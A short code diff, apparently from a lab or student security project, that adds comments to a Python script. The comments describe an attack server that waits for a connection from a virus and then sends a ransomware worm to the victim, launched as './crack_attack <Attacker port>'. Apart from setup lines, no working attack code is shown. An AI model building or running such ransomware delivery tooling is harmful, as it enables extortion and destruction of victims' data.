@@ -2,6 +2,13 @@
 import socket
 import sys
 
+# In this program:
+# we launch an attack server with <Attacker port> to wait for
+# the connection from the virus. If connection successes,
+# attack server will send ransomware worm to victim.
+
+# command: ./crack_attack <Attacker port>
+
 port = int(sys.argv[1])
 worm_name = "./my_worm"
 
